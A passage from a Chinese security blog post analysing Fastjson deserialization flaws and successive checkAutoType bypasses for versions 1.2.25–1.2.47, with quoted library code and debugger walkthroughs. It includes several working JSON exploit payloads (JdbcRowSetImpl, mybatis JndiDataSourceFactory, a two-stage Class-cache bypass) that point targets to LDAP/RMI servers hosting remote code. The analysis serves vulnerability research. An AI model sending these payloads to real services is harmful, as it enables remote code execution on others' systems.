+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p>
+<p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
+<ul>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
+</ul>
+<p>AutoType白名单设置方法：</p>
+<ol>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept("com.xx.a");</code></li>
+<li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
+</ol>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>前提条件：需要autoTypeSupport开启。</p>
+<p>EXP</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>分析：</p>
+<p>一路调试来到checkAutoType方法，会先进行白名单校验后进行黑名单校验，由于Lcom.sun.rowset.JdbcRowSetImpl;类并不在黑名单中，所以会来到TypeUtils.loadClass()方法中，此后面和之前的流程一样了。</p>
+<img src="/fastjson/18.png" class="">
+
+
+
+<p>漏洞点就在于此处会对以L开头和;结尾的类进行处理，即去掉L和；后再执行loadClass()方法，此方法后面的流程和前面版本的流程一致，所以可以产生漏洞。</p>
+<img src="/fastjson/19.png" class="">
+
+
+
+
+
+<h2 id="1-2-25-lt-Fastjson-lt-1-2-42绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-42绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.42绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.42绕过</h2><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>EXP</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>此处多了一部分校验类是否以L开头以；结尾，若是则除去L和;（写个过滤也用hash异或，搞这么复杂！！！）。后面的执行流程和前面一样，所以可以使用双写L和；进行绕过。</p>
+<img src="/fastjson/20.png" class="">
+
+
+
+<h2 id="1-2-25-lt-Fastjson-lt-1-2-43绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-43绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.43绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.43绕过</h2><p>EXP </p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">,</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1089/Evi"</span><span class="token punctuation">,</span><span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>上一个版本的修复，此处如果类名以LL开头则直接报错退出程序。</p>
+<img src="/fastjson/22.png" class="">
+
+
+
+<p>接着来到TypeUtils.loadClass()方法。此如果类名以[开头则提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类</p>
+<img src="/fastjson/21.png" class="">
+
+
+
+<p>此处返回的类名是[com.sun.rowset.JdbcRowSetImpl，会通过checkAutoType()函数的检测，后面会来到反序列化部分。</p>
+<p>在反序列化中，调用了<code>DefaultJSONParser.parseArray()</code>函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”<code>[</code>“、”<code>{</code>“等。满足这些条件后得到最终的payload。</p>
+<img src="/fastjson/23.png" class="">
+
+
+
+<h2 id="1-2-25-lt-Fastjson-lt-1-2-45绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-45绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.45绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.45绕过</h2><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
+<p>EXP</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span>
+	<span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
+	<span class="token string">"properties"</span><span class="token operator">:</span>
+	<span class="token punctuation">{</span>
+		<span class="token string">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>此处主要是绕过黑名单，因为黑名单中不包括org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类</p>
+<p>1.2.46版本修复则是直接把此类加入黑名单中。</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+</tbody></table>
+<p>此处对上一个版本的修复则是，当类以[开头则直接报错退出程序。</p>
+<img src="/fastjson/24.png" class="">
+
+
+
+<p>直接查看org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类的setProperties()方法。</p>
+<p>此处满足fastjson反序列化时自动调用的setter方法。方法中明显是jndi注入的入口。</p>
+<p>其中参数由我们输入的properties属性中的data_source值获取的。</p>
+<p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p>
+<img src="/fastjson/25.png" class="">
+
+
+
+<h2 id="1-2-25-lt-Fastjson-lt-1-2-47绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-47绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.47绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.47绕过</h2><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
+</ul>
+<p>EXP</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span>
+    <span class="token string">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+        <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token string">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+        <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span>
+        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>不受AutoTypeSupport影响版本（1.2.33-1.2.47）</li>
+</ul>
+<p>在第一次解析中，进入checkAutoType()函数后，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；来到TypeUtils.getClassFromMapping方法中。</p>
+<img src="/fastjson/28.png" class="">
+
+
+
+<p>TypeUtils.getClassFromMapping方法是在mappings中找键为className的值，此处mapping中并没有java.lang.class，所以此处返回Null。</p>
+<img src="/fastjson/29.png" class="">
+
+
+
+<p>接着会来到this.deserializers.findClass方法中。</p>
+<img src="/fastjson/30.png" class="">
+
+
+
+<p>findClass中逻辑是，在buckets中寻找keyString键的值，如果找到则返回类对象，此处java.lang.class类在此表中，所以会返回此类对象。</p>
+<img src="/fastjson/31.png" class="">
+
+
+
+<p>继续往下走，可知此处返回 java.lang.class类对象，所以第一次checkAutoType通过且返回Class类对象。</p>
+<img src="/fastjson/32.png" class="">
+
+
+
+<p>一路调试来到eserializer.deserialze方法中。直到此处，if判断语句中需要值为val,且将val中的值赋给objVal，后面会将objVal以String形式赋值给strVal。</p>
+<img src="/fastjson/33.png" class="">
+
+
+
+<p>最后会来到TypeUtils.loadClass中加载com.sun.rowset.JdbcRowSetImpl类。</p>
+<img src="/fastjson/34.png" class="">
+
+
+
+<p>跟踪TypeUtils.loadClass方法会来到此处，默认是开启缓存的，所以此处会将com.sun.rowset.JdbcRowSetImpl类加载到mappings中，</p>
+<p>这样第二次执行@type为com.sun.rowset.JdbcRowSetImpl时则会绕过checkAutoType达到漏洞效果。第二次执行流程类似就不详细讲了。</p>
+<img src="/fastjson/35.png" class="">
+
+
+
+<img src="/fastjson/36.png" class="">
+
+
+
+<ul>
+<li>受AutoTypeSupport影响版本（1.2.25-1.2.32）</li>
+</ul>
+<p>关键点在于，高版本的if判断多了一个&amp;&amp;TypeUtils.getClassFromMapping(typeName) == null，所以低版本的反而开启autotypesupport则无法进行利用。</p>
+<img src="/fastjson/37.png" class="">
+
+
+
+<img src="/fastjson/38.png" class="">
+
+
+
+<p>参考链接: [<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A6%82%E4%BD%95%E5%85%B3%E8%81%94-outputProperties%E4%B8%8EgetOutputProperties-%E6%96%B9%E6%B3%95]">https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A6%82%E4%BD%95%E5%85%B3%E8%81%94-outputProperties%E4%B8%8EgetOutputProperties-%E6%96%B9%E6%B3%95]</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Red6380</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://red6380.github.io/fastjson/">http://red6380.github.io/fastjson/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Red6380</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">反序列化</span>
+                                </a>
+                            
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'o2qDdHWSNC4s299kuYtYdkCp-MdYXbMMI',
+        appKey: 'muEbknjJB7cjGd2yTtgaBsfJ',
+        serverURLs: 'https://o2qddhws.api.lncldglobal.com',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+<!-- 直达评论 -->
+<div id="to_comment" class="comment-scroll">
+  <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="直达评论">
+    <i class="fas fa-comments"></i>
+  </a>
+</div>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/fastjson/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="fastjson反序列化漏洞分析">
+                        
+                        <span class="card-title">fastjson反序列化漏洞分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/java/" class="post-category">
+                                    java
+                                </a>
+                            
+                            <a href="/categories/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/snakeyaml/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="snakeYaml反序列化漏洞分析">
+                        
+                        <span class="card-title">snakeYaml反序列化漏洞分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/java/" class="post-category">
+                                    java
+                                </a>
+                            
+                            <a href="/categories/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h1,h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
